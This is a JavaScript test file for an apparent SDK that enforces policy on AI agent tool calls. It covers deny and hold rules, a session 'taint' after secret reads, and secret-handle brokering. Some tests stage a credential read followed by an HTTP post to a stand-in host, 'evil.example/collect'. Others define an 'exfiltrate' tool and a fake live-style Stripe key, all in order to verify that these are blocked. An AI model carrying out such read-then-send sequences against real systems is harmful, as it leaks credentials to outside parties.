import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { CirvixDenied, CirvixHeld, Guard, guard, wrap } from "../src/core/guard.mjs";
import { evaluate, expectNoLoosening, loadPolicy } from "../src/testing.mjs";
import { HANDLE_PREFIX } from "../src/core/secrets.mjs";

const CWD = "/workspace";

const RULES = [
  {
    name: "deny-dotenv-read",
    effect: "forbid",
    actions: ["fs.read"],
    resources: ["**/.env", "**/.env.*"],
    reason: "Reading .env files is denied outside an approved secrets flow.",
    remediation: 'Request the value as a handle: secrets.get("STRIPE_KEY")',
  },
  {
    name: "hold-production-writes",
    effect: "hold",
    actions: ["fs.write", "k8s.apply"],
    resources: ["*"],
    when: [{ path: "environment", op: "eq", value: "production" }],
    approvers: ["platform-oncall"],
  },
  { name: "allow-reads", effect: "permit", actions: ["fs.read", "fs.list"], resources: ["*"] },
  { name: "allow-writes", effect: "permit", actions: ["fs.write"], resources: ["*"] },
  { name: "allow-http", effect: "permit", actions: ["http.request"], resources: ["*"] },
];

const options = (over = {}) => ({ rules: RULES, agent: "pr-triage", cwd: CWD, ...over });

/* -------------------------------------------------------------------------- */
/*  wrap — the shapes tool collections actually come in                        */
/* -------------------------------------------------------------------------- */

test("an object of named functions is governed and keeps its shape", async () => {
  const tools = wrap(
    {
      read_file: async ({ path }) => `contents of ${path}`,
      unrelated: "not a function",
    },
    options(),
  );

  assert.equal(typeof tools.read_file, "function");
  assert.equal(tools.unrelated, "not a function", "a non-function value was mangled");
  assert.equal(await tools.read_file({ path: "/workspace/app.ts" }), "contents of /workspace/app.ts");
});

test("an array of tool objects is governed without losing its metadata", async () => {
  // LangChain, CrewAI, and AutoGen all hand over objects carrying a callable
  // plus a description and a schema the framework reads back afterwards.
  const original = [
    {
      name: "read_file",
      description: "Reads a file.",
      schema: { type: "object" },
      async func({ path }) {
        return `read ${path}`;
      },
    },
  ];
  const [tool] = wrap(original, options());

  assert.equal(tool.description, "Reads a file.");
  assert.deepEqual(tool.schema, { type: "object" });
  assert.equal(await tool.func({ path: "/workspace/a.ts" }), "read /workspace/a.ts");
  // The caller's own array is untouched — a framework holding the originals
  // must not find them governed as a side effect of us reading them.
  assert.notEqual(original[0].func, tool.func);
});

test("a bare function is governed and keeps its name", async () => {
  // Frameworks introspect `fn.name` to build their registry; an anonymous
  // wrapper would silently rename every tool.
  const governed = wrap(async ({ path }) => `read ${path}`, options({ name: "read_file" }));
  assert.equal(governed.name, "read_file");
  assert.equal(await governed({ path: "/workspace/a.ts" }), "read /workspace/a.ts");
});

test("guard.wrap is the documented entry point", () => {
  assert.equal(typeof guard.wrap, "function");
  assert.equal(guard.wrap, wrap);
});

/* -------------------------------------------------------------------------- */
/*  Refusals an agent can act on                                               */
/* -------------------------------------------------------------------------- */

test("a denied call throws a typed error carrying the way forward", async () => {
  const tools = wrap({ read_file: async () => "should never run" }, options());

  await assert.rejects(
    () => tools.read_file({ path: "/workspace/.env.production" }),
    (err) => {
      assert.ok(err instanceof CirvixDenied);
      assert.equal(err.policy, "deny-dotenv-read");
      assert.match(err.decisionId, /^dec_/);
      assert.match(err.reason, /denied outside an approved secrets flow/);
      // The property that lets an agent re-plan rather than retry.
      assert.match(err.remediation, /secrets\.get/);
      assert.equal(err.appealable, false);
      return true;
    },
  );
});

test("the tool itself never runs when the call is denied", async () => {
  let ran = false;
  const tools = wrap(
    {
      read_file: async () => {
        ran = true;
        return "executed";
      },
    },
    options(),
  );

  await assert.rejects(() => tools.read_file({ path: "/workspace/.env" }));
  assert.equal(ran, false, "a denied tool executed anyway");
});

test("a held call is a different type from a denial, because it needs different behaviour", async () => {
  // A denial means re-plan. A hold means this exact call may still happen once
  // somebody says yes. Collapsing them teaches agents to treat both as failure.
  const tools = wrap({ write_file: async () => "written" }, options({ environment: "production" }));

  await assert.rejects(
    () => tools.write_file({ path: "/workspace/out.txt" }),
    (err) => {
      assert.ok(err instanceof CirvixHeld);
      assert.ok(err instanceof CirvixDenied, "a hold should still be catchable as a refusal");
      assert.equal(err.policy, "hold-production-writes");
      assert.equal(err.appealable, true);
      assert.deepEqual(err.approvers, ["platform-oncall"]);
      return true;
    },
  );
});

test("default deny reaches the caller as a refusal it can read", async () => {
  const tools = wrap({ delete_file: async () => "gone" }, options({ rules: [] }));
  await assert.rejects(
    () => tools.delete_file({ path: "/workspace/a.ts" }),
    (err) => {
      assert.equal(err.policy, null);
      assert.match(err.reason, /default-deny|No rule permits/i);
      return true;
    },
  );
});

/* -------------------------------------------------------------------------- */
/*  Session state                                                              */
/* -------------------------------------------------------------------------- */

test("reading secret-shaped material taints the session for the rest of it", async () => {
  // The property that makes "read a credential, then post it somewhere" fail
  // even when both calls are individually allowed.
  const rules = [
    ...RULES,
    {
      name: "deny-egress-after-secret",
      effect: "forbid",
      actions: ["http.request"],
      resources: ["*"],
      when: [
        { path: "egress.external", op: "eq", value: true },
        { path: "session.touchedSecret", op: "eq", value: true },
      ],
    },
  ];
  const g = new Guard(options({ rules }));
  const tools = wrap(
    {
      read_file: async () => "contents",
      http_request: async () => "posted",
    },
    { guard: g },
  );

  // Allowed before the taint.
  assert.equal(await tools.http_request({ url: "https://evil.example/collect" }), "posted");

  await tools.read_file({ path: "/workspace/credentials.txt" });
  assert.equal(g.touchedSecret, true);

  await assert.rejects(
    () => tools.http_request({ url: "https://evil.example/collect" }),
    /read secret material|deny-egress-after-secret|Denied/i,
  );
});

test("one guard is shared across the whole tool collection", async () => {
  // Otherwise each tool has its own session and the taint above never crosses
  // from the tool that read the secret to the tool that would send it.
  const g = new Guard(options());
  const tools = wrap(
    { read_file: async () => "a", list_dir: async () => "b" },
    { guard: g },
  );
  await tools.read_file({ path: "/workspace/x" });
  await tools.list_dir({ path: "/workspace/y" });
  assert.equal(g.stats.calls, 2);
  assert.equal(g.stats.permitted, 2);
});

test("a tool nobody wrote a rule for is denied, not waved through", async () => {
  // The default-deny property, reaching the SDK surface: an unrecognised tool
  // name maps to `tool.<name>`, which no starter rule permits.
  const tools = wrap({ exfiltrate: async () => "sent" }, options());
  await assert.rejects(() => tools.exfiltrate({ path: "/workspace/x" }), CirvixDenied);
});

test("every decision reaches the telemetry sink, permitted or not", async () => {
  const decisions = [];
  const tools = wrap(
    { read_file: async () => "ok" },
    options({ onDecision: (d) => decisions.push(d) }),
  );

  await tools.read_file({ path: "/workspace/a.ts" });
  await assert.rejects(() => tools.read_file({ path: "/workspace/.env" }));

  assert.equal(decisions.length, 2);
  assert.deepEqual(
    decisions.map((d) => d.verdict),
    ["permit", "deny"],
  );
  // The same record shape the gateway ships, so a run recorded through the SDK
  // is replayable exactly like one recorded through the gateway.
  assert.ok(decisions[0].context);
  assert.ok(Array.isArray(decisions[0].considered));
  assert.match(decisions[0].decision_id, /^dec_/);
});

/* -------------------------------------------------------------------------- */
/*  Secret brokering through the SDK                                           */
/* -------------------------------------------------------------------------- */

test("handles are substituted on the way out and scrubbed on the way back", async () => {
  const handle = `${HANDLE_PREFIX}${"a".repeat(32)}`;
  const REAL = "rk_live_51H8xKzQ2eZvKYlo2C";

  // A stand-in broker with the same surface as SecretsClient.
  const resolved = new Map();
  const secrets = {
    async substitute(args, { destination }) {
      const text = JSON.stringify(args);
      if (!text.includes(handle)) return { ok: true, value: args, substituted: [] };
      if (!destination?.includes("api.stripe.com")) {
        return { ok: false, reason: "not sanctioned for that destination", outcome: "destination_denied" };
      }
      resolved.set(handle, REAL);
      return { ok: true, value: JSON.parse(text.split(handle).join(REAL)), substituted: ["STRIPE"] };
    },
    redact(payload) {
      const text = JSON.stringify(payload ?? "");
      if (!resolved.size || !text.includes(REAL)) return { payload, findings: [] };
      return {
        payload: JSON.parse(text.split(REAL).join(handle)),
        findings: [{ handle, name: "STRIPE", secretId: "sec_1" }],
      };
    },
  };

  const g = new Guard(options({ secrets }));
  const tools = wrap(
    { http_request: async (args) => ({ echoed: args }) },
    { guard: g },
  );

  const result = await tools.http_request({
    url: "https://api.stripe.com/v1/charges",
    authorization: `Bearer ${handle}`,
  });

  const text = JSON.stringify(result);
  assert.ok(!text.includes(REAL), "a resolved credential reached the caller");
  assert.ok(text.includes(handle), "the handle was not restored in its place");
  assert.equal(g.stats.leaks, 1);
});

test("a handle presented off-path denies the call instead of leaking it upstream", async () => {
  const handle = `${HANDLE_PREFIX}${"b".repeat(32)}`;
  const secrets = {
    async substitute() {
      return { ok: false, reason: "not sanctioned for that destination", outcome: "destination_denied" };
    },
    redact: (payload) => ({ payload, findings: [] }),
  };

  let ran = false;
  const tools = wrap(
    {
      http_request: async () => {
        ran = true;
        return "sent";
      },
    },
    options({ secrets }),
  );

  await assert.rejects(
    () => tools.http_request({ url: "https://evil.example", authorization: `Bearer ${handle}` }),
    (err) => {
      assert.equal(err.policy, "secret-broker");
      assert.match(err.remediation, /allowlist/);
      return true;
    },
  );
  assert.equal(ran, false, "the call went out despite an unresolvable handle");
});

/* -------------------------------------------------------------------------- */
/*  Policy testing                                                             */
/* -------------------------------------------------------------------------- */

test("evaluate answers a policy question without executing anything", async () => {
  const decision = await evaluate({
    rules: RULES,
    agent: "deploy-bot",
    action: "k8s.apply",
    resource: "production/checkout",
    context: { environment: "production" },
  });

  assert.equal(decision.verdict, "hold");
  assert.ok(decision.approvers.includes("platform-oncall"));
});

test("evaluate fills in a permissive context so a test asserts one thing", async () => {
  // A denial should come from the rule under test, not from a restrictive
  // default that would have denied anything.
  const permitted = await evaluate({ rules: RULES, action: "fs.read", resource: "/repo/app.ts" });
  assert.equal(permitted.verdict, "permit");

  const denied = await evaluate({ rules: RULES, action: "fs.read", resource: "/repo/.env" });
  assert.equal(denied.verdict, "deny");
  assert.equal(denied.rule, "deny-dotenv-read");
});

test("evaluate refuses to guess at a missing action", async () => {
  await assert.rejects(() => evaluate({ rules: RULES, resource: "x" }), /needs an action/);
});

test("a policy directory loads, and a duplicated rule name is refused", async () => {
  const dir = await mkdtemp(join(tmpdir(), "cirvix-policy-"));
  await writeFile(join(dir, "01-base.json"), JSON.stringify([RULES[0]]), "utf8");
  await writeFile(join(dir, "02-extra.json"), JSON.stringify([RULES[2]]), "utf8");
  assert.equal((await loadPolicy({ policyDir: dir })).length, 2);

  // A duplicate name across files silently shadows a rule, which is exactly
  // the bug a directory of policies invites.
  await writeFile(join(dir, "03-clash.json"), JSON.stringify([RULES[0]]), "utf8");
  await assert.rejects(() => loadPolicy({ policyDir: dir }), /Duplicate rule/);
});

test("expectNoLoosening catches a policy change that widens what is allowed", async () => {
  const calls = [
    { action: "fs.read", resource: "/repo/.env" },
    { action: "fs.read", resource: "/repo/app.ts" },
  ];

  const same = await expectNoLoosening({ before: { rules: RULES }, after: { rules: RULES }, calls });
  assert.equal(same.ok, true);

  // Dropping the prohibition is the change a reviewer must not miss.
  const loosened = await expectNoLoosening({
    before: { rules: RULES },
    after: { rules: RULES.filter((r) => r.name !== "deny-dotenv-read") },
    calls,
  });
  assert.equal(loosened.ok, false);
  assert.equal(loosened.loosened.length, 1);
  assert.equal(loosened.loosened[0].was, "deny");
  assert.equal(loosened.loosened[0].now, "permit");

  // Tightening is allowed to pass: a policy is permitted to move that way
  // without surprising anybody.
  const tightened = await expectNoLoosening({
    before: { rules: RULES },
    after: { rules: [{ name: "deny-all", effect: "forbid", actions: ["*"], resources: ["*"] }] },
    calls,
  });
  assert.equal(tightened.ok, true);
});
